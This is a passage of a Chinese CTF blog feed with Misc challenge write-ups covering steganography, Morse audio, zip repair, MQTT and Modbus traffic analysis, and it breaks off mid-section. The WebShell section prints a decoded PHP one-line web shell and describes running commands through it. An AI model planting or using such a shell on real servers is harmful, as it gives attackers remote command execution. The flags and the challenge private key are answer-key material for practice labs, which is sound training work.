            "content_html": "<h1 id=\"week2\"><a class=\"markdownIt-Anchor\" href=\"#week2\">#</a> <strong>WEEK2</strong></h1>\n<h2 id=\"新建word文档\"><a class=\"markdownIt-Anchor\" href=\"#新建word文档\">#</a> 新建 Word 文档</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/v7EVjEwOIoNLCVav.png!thumbnail\" alt=\"\"></p>\n<p>这是文档所做的一个限制导致无法复制，直接右键字体中取消隐藏文字的勾选即可复制</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">新佛曰：毘諸隸僧降吽諸陀摩隸僧缽薩願毘耨咤陀願羅咤喃修願宣亦宣寂叻寂阿是吽阿塞尊劫毘般毘所聞降毘咒塞尊薩咒毘所若降般斯毘嚴毘嚴波斯迦毘色毘波嚴毘喃念若修嘚般毘我毘如毘如囑囑</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2hpLnBjbW9lLm5ldC9idWRkaGEuaHRtbA==\">http://hi.pcmoe.net/buddha.html</span><br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/CfnzVEMjPjKI4DzE.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>解密得到 flag</p>\n<p><strong>flag{Th1s_F0_1s_s00_Cyp3r_495586e3df3a}</strong></p>\n<h2 id=\"永不消逝的电波\"><a class=\"markdownIt-Anchor\" href=\"#永不消逝的电波\">#</a> 永不消逝的电波</h2>\n<p>将 wav 文件使用 au 进行查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EFvT4GwOt1iOm2Dx.png!thumbnail\" alt=\"\"></p>\n<p>摩斯密码，手敲出来</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YNAUh8kIKg95Abj6.png!thumbnail\" alt=\"\"></p>\n<p>这里由于解密问题 flag 其实是全小写，可以使用别的在线网站也可以直接转为小写提交</p>\n<p><strong>flag{thebestctferisyou}</strong></p>\n<h2 id=\"base\"><a class=\"markdownIt-Anchor\" href=\"#base\">#</a> base!</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BBDm6RvMknxfUIDG.png!thumbnail\" alt=\"\"></p>\n<p>base 隐写，脚本一把梭</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def get_base64_diff_value(s1, s2):</span><br><span class=\"line\">    base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><span class=\"line\">    res = 0</span><br><span class=\"line\">    for i in xrange(len(s2)):</span><br><span class=\"line\">        if s1[i] != s2[i]:</span><br><span class=\"line\">            return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class=\"line\">    return res</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def solve_stego():</span><br><span class=\"line\">    with open(&#x27;base.txt&#x27;, &#x27;rb&#x27;) as f:</span><br><span class=\"line\">        file_lines = f.readlines()</span><br><span class=\"line\">        bin_str = &#x27;&#x27;</span><br><span class=\"line\">        for line in file_lines:</span><br><span class=\"line\">            steg_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;)</span><br><span class=\"line\">            norm_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;).decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;)</span><br><span class=\"line\">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class=\"line\">            print diff</span><br><span class=\"line\">            pads_num = steg_line.count(&#x27;=&#x27;)</span><br><span class=\"line\">            if diff:</span><br><span class=\"line\">                bin_str += bin(diff)[2:].zfill(pads_num * 2)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                bin_str += &#x27;0&#x27; * pads_num * 2</span><br><span class=\"line\">            print goflag(bin_str)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def goflag(bin_str):</span><br><span class=\"line\">    res_str = &#x27;&#x27;</span><br><span class=\"line\">    for i in xrange(0, len(bin_str), 8):</span><br><span class=\"line\">        res_str += chr(int(bin_str[i:i + 8], 2))</span><br><span class=\"line\">    return res_str</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    solve_stego()</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3fEh1xZ4STcLIlP4.png!thumbnail\" alt=\"\"></p>\n<p>得到 iDMb6ZMnTFMtFuouYZHwPTYAoWjC7Hjca8</p>\n<p>base58 解码得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7zk8eOvNtd33FC5w.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{b4se_1s_4_g0od_c0d3}</strong></p>\n<h2 id=\"1-序章\"><a class=\"markdownIt-Anchor\" href=\"#1-序章\">#</a> 1 - 序章</h2>\n<p>分析 sql 注入日志，手动筛选出注入成功的 10 进制</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/nRIczEKu9SFDZjwV.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>flag{just_w4rm_up_s0_you_n3ed_h4rder_6026cd32}</strong></p>\n<h2 id=\"webshell的利用\"><a class=\"markdownIt-Anchor\" href=\"#webshell的利用\">#</a> WebShell 的利用</h2>\n<p>附件给了马，需要我们自行解密得到密码</p>\n<p>可以动调直接得到，也可以使用 python 脚本一次次解密</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\">import binascii</span><br><span class=\"line\">import codecs</span><br><span class=\"line\"></span><br><span class=\"line\">def convert_uudecode(encoded_string):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        decoded_bytes = binascii.a2b_uu(encoded_string)</span><br><span class=\"line\">        return decoded_bytes</span><br><span class=\"line\">    except Exception as e:</span><br><span class=\"line\">        return str(e)</span><br><span class=\"line\">str=&quot;密文&quot;</span><br><span class=\"line\">decoded_str = base64.b64decode(str)</span><br><span class=\"line\"></span><br><span class=\"line\">decoded_str = decoded_str.decode(&#x27;utf-8&#x27;)</span><br><span class=\"line\">decoded_str = codecs.encode(decoded_str, &#x27;rot_13&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">with open(&quot;output.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:</span><br><span class=\"line\">    f.write(decoded_str)</span><br><span class=\"line\">with open(&quot;output.txt&quot;, &quot;r&quot;) as file:</span><br><span class=\"line\">    for line in file:</span><br><span class=\"line\">        decoded_bytes = convert_uudecode(line)</span><br><span class=\"line\">        decoded_str = decoded_bytes.decode(&#x27;utf-8&#x27;)</span><br><span class=\"line\">        decoded_str = codecs.encode(decoded_str, &#x27;rot_13&#x27;)</span><br><span class=\"line\">        print(decoded_str,end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>\n<p>这里自己写了一个解密脚本，刚开始以为只有一层，于是就写了一次的，结果发现套了好几层，懒得进行循环了，发现不多就手动循环了一下最终得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);($_GET[&#x27;7d67973a&#x27;])($_POST[&#x27;9fa3&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>get 传参加上 post 传参，拼接命令执行读取根目录下的 flag<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/RJXF2szDDITSQWDp.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<h2 id=\"jvav\"><a class=\"markdownIt-Anchor\" href=\"#jvav\">#</a> Jvav</h2>\n<p>刚开始以为是什么新知识点，结果发现题目其实是个梗，要告诉我们的是 java 语言这个信息</p>\n<p>结合图片为只有一张 png 图片，想到了 java 盲水印</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar BlindWatermark.jar decode -c challenge.png 1.png</span><br></pre></td></tr></table></figure>\n<p>得到<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jsrA8y98AoCdMbGh.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>flag{*</strong>*3bb3c3a628a94c}**</p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK1/",
            "url": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK1/",
            "title": "NewStarCTF2023Misc week1",
            "date_published": "2024-04-16T05:58:19.008Z",
            "content_html": "<h1 id=\"week1\"><a class=\"markdownIt-Anchor\" href=\"#week1\">#</a> WEEK1</h1>\n<h2 id=\"cyberchefs-secret\"><a class=\"markdownIt-Anchor\" href=\"#cyberchefs-secret\">#</a> CyberChef’s Secret</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/SlADFSEVyAAjmd1A.png!thumbnail\" alt=\"\"></p>\n<p>cyberchef 一把梭得到 flag</p>\n<p><em><em>flag{Base_15_S0_Easy</em>^*^}</em>*</p>\n<h2 id=\"机密图片\"><a class=\"markdownIt-Anchor\" href=\"#机密图片\">#</a> 机密图片</h2>\n<p>得到一张二维码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5E0ukxYfJrjxhyQ3.png!thumbnail\" alt=\"\"></p>\n<p>扫描了一下没东西，发现是 lsb 隐写，zsteg 一把梭</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MSCVb1maxJpMciYX.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece}</strong></p>\n<h2 id=\"流量鲨鱼\"><a class=\"markdownIt-Anchor\" href=\"#流量鲨鱼\">#</a> 流量！鲨鱼！</h2>\n<p>分析流量包，导出 http 对象中发现了可疑文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fm8MJgsyGuRqYssW.png!thumbnail\" alt=\"\"></p>\n<p>保存下来得到一串 base64 编码，解码得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aMfWX3QeG9Y8ksle.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{Wri35h4rk_1s_u53ful_b72a609537e6}</strong></p>\n<h2 id=\"压缩包们\"><a class=\"markdownIt-Anchor\" href=\"#压缩包们\">#</a> 压缩包们</h2>\n<p>得到一个无后缀文件，拖入 winhex 查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7eopXjr01zh0fhFd.png!thumbnail\" alt=\"\"></p>\n<p>发现是一个缺失头的压缩包，手动修复</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ooZnTdBacElb4Uiw.png!thumbnail\" alt=\"\"></p>\n<p>保存后解压下一个 flag.zip，解码注释可以知道压缩包密码是 6 位数，但是这里显示压缩包损坏（并且显示未加密），证明没有修复完全，对照着加密正确的加密压缩包进行修补</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zSIKOKXfdXFVbVSG.png!thumbnail\" alt=\"\"></p>\n<p>得到修复好的压缩包</p>\n<p>使用 ARCHPR 进行爆破得到密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9QudM0ynKfBMOXsZ.png!thumbnail\" alt=\"\"></p>\n<p>解压得到 flag</p>\n<p><strong>flag{y0u_ar3_the_m4ter_of_z1111ppp_606a4adc}</strong></p>\n<h2 id=\"空白格\"><a class=\"markdownIt-Anchor\" href=\"#空白格\">#</a> 空白格</h2>\n<p>点开附件发现是空白的，用 sublime 打开</p>\n<p>选中之后发现有东西</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/0vrGzyTSd4q4pXXg.png!thumbnail\" alt=\"\"></p>\n<p>whitespace 加密</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly92aWk1YXJkLmdpdGh1Yi5pby93aGl0ZXNwYWNlLw==\">https://vii5ard.github.io/whitespace/</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/u69KZXXiR3uNmvd3.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>flag{w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04}</strong></p>\n<h2 id=\"隐秘的眼睛\"><a class=\"markdownIt-Anchor\" href=\"#隐秘的眼睛\">#</a> 隐秘的眼睛</h2>\n<p>看题目就知道是考 silenteye 了，直接使用默认密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/b9F1RVI5uAVxKGLI.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>flag{R0ck1ng_y0u_63b0dc13a591}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/MQTT/",
            "url": "https://nnnpc.github.io/2024/04/16/MQTT/",
            "title": "某工控Misc MQTT协议流量分析",
            "date_published": "2024-04-16T05:58:19.007Z",
            "content_html": "<p>本题的考点在于 MQTT 协议流量的分析和 rsa 解密，首先看到流量包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/br3Nq1ffF08DaaSz.png!thumbnail\" alt=\"\"></p>\n<p>很干净不需要过滤，去了解下 MQTT 协议能知道</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/AjNPCVwBJCqNkoSy.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/RQNvdc0RnlqdpVio.png!thumbnail\" alt=\"\"></p>\n<p>每个包的 message 字段中存储了需要传输的值，先看了头几个包</p>\n<p>发现了 rsakey 字段，于是使用命令提取数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tshark -r Covertchannel.pcap -Y &quot;mqtt&quot; -T fields -e mqtt.msg &gt; 1.txt</span><br></pre></td></tr></table></figure>\n<p>简单做一下处理：（删除逗号和换行）并进行 16 进制转换和 base64 解码，得到私钥，secret.txt 和 data.zip<br>\n 发现 data.zip 文件需要密码</p>\n<p>那么猜测需要利用私钥去解密被公钥加密的文件 secret.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----BEGIN PRIVATE KEY-----</span><br><span class=\"line\">MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC1YaMyRuhD9Pu5</span><br><span class=\"line\">w6GNhfYTQ0Vo/0OjZPKyDS3viCZIuXUsUn/vQxMJPWlCQq7rRv2c7+z8PTxeirV7</span><br><span class=\"line\">1fPT/sFxgxHbjZeFDRCvU7Pc4ZknT8rTymGWR9WB6XEi8s06gWQegxOKgq7smDJs</span><br><span class=\"line\">Qow+7OGes1Xm8HxgeDjjghzeN2dS75kswo+HF6hzZVKiJGoju/jyp2hqdjuMYySv</span><br><span class=\"line\">BHzlLoH5r1Yrdg/hEIOaua2h7s5p5ybJ+8aIqTEFz5Q/FuM4z9LE0O8ysJxo4WRV</span><br><span class=\"line\">+cbtWCD17kGIjRxHW5tTTszqrwHMISVyZq+5Ib1K7DGE3a/Ek/weYp5Fh8bX8LbH</span><br><span class=\"line\">RSwBsopXAgMBAAECggEADw3xDSm8enN5dzQpEwWE5JlnR+0z8Hpe+G9GmkR7JPsb</span><br><span class=\"line\">oheg3bt7937c3y6ItSd5wk5ZpZ/xhElQAdzCtZxF8wV1dHsekeEBOwQgABvLaeti</span><br><span class=\"line\">As0f52jD7FnzVXrAlPQLWsr3Ur5BBYsmWDz3xftESLdK0HWyZRFla2Cvw7PmhAgS</span><br><span class=\"line\">CDYvj5S0qk0h7KrNGJMfM8o+j7lE3ZKv5pTTVQ+/GUwF0q+Ujk75Zg3WMfGQQVOT</span><br><span class=\"line\">nM0kOa970Yfb7V2UHcQn9HCxHY0wc+/PK4jtn2h4htTrNBBTa4B6zTDY8sfYg0XB</span><br><span class=\"line\">+M2H57We0r7azWmdeVAM3woocqbNYMUFUB/PVR36CQKBgQDD5OxBcMepIDnWXb0c</span><br><span class=\"line\">ict5/O67VhkWUb64vA695P9luBtCKxfnhlSnPjPt3olCy5KInB02MnNJMHV4haqY</span><br><span class=\"line\">Gtxb+1GeXK3pJo837s7w7bnVAE3eP3OmYHk4aq8LMtxacd8WZ0UyUH16+4hKbrh+</span><br><span class=\"line\">JowSwZvLixWaJq0XaSIOkmO83wKBgQDtCMMjMzhiNEhNDHtc+SlVzqlXKtIp61ag</span><br><span class=\"line\">pavufiUUEKyRoG8i1GoIIPn7u2hEBF8Rm3euuWLl1SHAjWswNEUJnp2rO5sFGJBK</span><br><span class=\"line\">sgpIyxFkiSYFoXWKVd0r7k/KNPk1ShpHZhSJqEsYqmDjbTFFVxUCj3xerfZlqLQT</span><br><span class=\"line\">dzdOnoVpiQKBgQCG3RDmEL30qtIGyixK/HbQehjlcmX9HrQePKIti/1kyzZA/KgN</span><br><span class=\"line\">ZkbbiRB5QA7hpIMyd8AIsvz5s1n8apHC/CMfVEuhqg61CC3rhQaFijS49uelDawS</span><br><span class=\"line\">LDLoa1ItdIuN3P2IT/qspAtvYsI29Dkh6Gng89fNbuilYuEhz+h5fcEaowKBgBlc</span><br><span class=\"line\">aqSFgm7fcSztPPXBou6PYgb1ie76QxaFI1QtIwJ2lkAujjWHzKB6BsUsVAeTACj+</span><br><span class=\"line\">HVwQcchteWMEvoc10H0q/2umwPtWmXmkev023PGIywynLdBTR4q/wMG90TwmZZFm</span><br><span class=\"line\">FqRz4TUOZbdvo2nr20+e0ou+yTIvTrUWeFBtHZEhAoGACualPMp1+DKOnGRKqpBA</span><br><span class=\"line\">c/W/ObkBBgQsV11k+wy1AZ0SVUjY0DkEKdKAMxQ6v0+ERCrbgVOux0xGR7MF7RGY</span><br><span class=\"line\">OwuVNDyCUT/gbqkxU3aUmT9oa+kbnxHtdUsbqeziEJ9xMLWlDygVfv4ae+InKbS0</span><br><span class=\"line\">MnZAAXUNDQIu5dxYCGPlrfA=</span><br><span class=\"line\">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure>\n<p>secret.txt：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bFBkNlE3SDF1ZjRTTkVLSDRJRTFLZzJpREZrMERCaEp3Q0JzZEkyV2h6T0dhcDA4a2RQWVFGcjZhcFN2WmlUSHZqaVgydG1VbEk5aTJ3aC8xZ2h3SUs5N1BiSERxMStTeEUxbnI0Nm0wUC9DMXpna0IyMit1M1YycTE5SU9BYXRuYXNya1BESkxQaW0reG54N3QxTnlBN1ZKTHdzUk5DUG9xRWdMbWZRQnd1elBCalhDdHVmUVkva0FpaDdLdTRPblVXa0pYRHlkSWxPTnplamVJK21RRy84VVFITTRQYnNjam9vdlJ2ZWMrYUpSMWxqODAzMXFjbSsyWnZJZFIrZElEYkNXMmtZam1OYm1XK0w2UG5LQ2Uvc3VKSjRBZVI0Sm1NbGVRRVJMemltZ1huV25GUnY4WnppVXNyS1lVVXRNb2w5V1hKazg4VjdRSE1yL0wzRkVnPT=</span><br></pre></td></tr></table></figure>\n<p>在线网站分解私钥之后使用脚本进行解密<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oaWVuY29kZS5jb20vcHJpdl9hc3lzLmh0bWw=\"> http://www.hiencode.com/priv_asys.html</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from base64 import *</span><br><span class=\"line\">from Crypto.Util.number import *</span><br><span class=\"line\">n = 22897280037618974619340846752999631827813818170571516093336584434775675187911179854957453351224025346333112420553633170369593452474468994360875843672122891197414738125554960475847811974999960386639323750005461211814555798539418918028176295505664790681416998283240971057298698033755526560483652785000652359544503171667435140921558876010825999934580334820605796539553023241585105667208475754931859753698830927470458071231845332752109628151991221800856650720139024371213297529175153974325381443615718839995260607889829031612063951205623842853683671813857941916059109130631113924524369318816564540461224076941697301514839</span><br><span class=\"line\">d = 1900449437182483367287250498389329650844458305061625673889624960449246764188822540260327257945635074406502662795085030291673460560215971051863590821284350316131917360177551726633415829806251194334873453746047366551189042314344098823782976935213141109778716788404859271345595128776312414754273606115797923459124942020459641900581560513546440430423068817960532088772269553080009423772016559433423351574011538603757410467222208992113233166851765907432319285253284046549512288457264075133865582854163144527301952940757041488705998905401183446222196348514190895895140391122398911374890210750891922002358312637449887414793</span><br><span class=\"line\">ksecret = b&quot;lPd6Q7H1uf4SNEKH4IE1Kg2iDFk0DBhJwCBsdI2WhzOGap08kdPYQFr6apSvZiTHvjiX2tmUlI9i2wh/1ghwIK97PbHDq1+SxE1nr46m0P/C1zgkB22+u3V2q19IOAatnasrkPDJLPim+xnx7t1NyA7VJLwsRNCPoqEgLmfQBwuzPBjXCtufQY/kAih7Ku4OnUWkJXDydIlONzejeI+mQG/8UQHM4PbscjoovRvec+aJR1lj8031qcm+2ZvIdR+dIDbCW2kYjmNbmW+L6PnKCe/suJJ4AeR4JmMleQERLzimgXnWnFRv8ZziUsrKYUUtMol9WXJk88V7QHMr/L3FEg==&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">c = bytes_to_long(b64decode(ksecret))</span><br><span class=\"line\">print(long_to_bytes(pow(c,d,n)))</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8ysy8AOcf2RsK43v.png!thumbnail\" alt=\"\"></p>\n<p>得到密码：b4ddfa11-4c91-48da-8e57-37d86a3f40ee</p>\n<p>解压压缩包得到 1.txt 文件，是个 mimikatz 爆破结果，在里面找到 username 为 flag</p>\n<p>password 便是 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vojec67wEkfyZ2AZ.png!thumbnail\" alt=\"\"></p>\n",
            "tags": [
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/Modbus%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/",
            "url": "https://nnnpc.github.io/2024/04/16/Modbus%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/",
            "title": "Modbus协议流量分析",
            "date_published": "2024-04-16T05:58:19.005Z",
            "content_html": "<p>记一次 Modbus 协议流量分析</p>\n<p>首先协议分级能够发现是 Modbus/TCP 的类型的流量</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/nogwwyfVtbDVq7IG.png!thumbnail\" alt=\"\"></p>\n<p>同时这也是题目中考的最多的 Modbus 协议流量</p>\n<p>常见的功能码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1：读线圈</span><br><span class=\"line\"></span><br><span class=\"line\">2：读离散输入</span><br><span class=\"line\"></span><br><span class=\"line\">3：读保持</span><br><span class=\"line\"></span><br><span class=\"line\">4：读输入</span><br><span class=\"line\"></span><br><span class=\"line\">5：写单个线圈</span><br><span class=\"line\"></span><br><span class=\"line\">6：写单个保持</span><br><span class=\"line\"></span><br><span class=\"line\">15：写多个线圈</span><br><span class=\"line\"></span><br><span class=\"line\">16：写多个保持</span><br></pre></td></tr></table></figure>\n<p>首先先过滤一下 modbus 协议的流量</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231126151613792.png\" alt=\"\"></p>\n<p>翻了翻，发现该流量包中只有两种功能码，一个是 3（读保持）一个是 6（写单个保持）</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231126152334120.png\" alt=\"\"></p>\n<p>首先先将功能码 6 且选中进行过滤，并将 data 都提取出来</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231126152810732.png\" alt=\"\"></p>\n<p>转码也并没有什么发现</p>\n<p>接下来同样的方法过滤功能码 3</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231126153115071.png\" alt=\"\"></p>\n<p>发现每次的回复包都有一组可疑的数据，并且随着包的标号往下看，从每一组的第一个数开始依次轮换了三次，也就是有四组数据，把他们都提取出来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">71 71 81 63 79 64 43 40 41 41</span><br><span class=\"line\"></span><br><span class=\"line\">112 65 35 86 83 101 98 77 96 91</span><br><span class=\"line\"></span><br><span class=\"line\">74 93 88 71 90 85 68 73 68 85</span><br><span class=\"line\"></span><br><span class=\"line\">90 93 0 1 2 3 4 3 2 1</span><br></pre></td></tr></table></figure>\n<p>直接转 ascii 码并不正确，但是由于数据可疑并且长度差不多，我们计算一下标头数据和 flag 头字母 ascii 码的偏移量，发现都是一样的</p>\n<p>利用脚本加上偏移转换成 ascii 码得到 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td 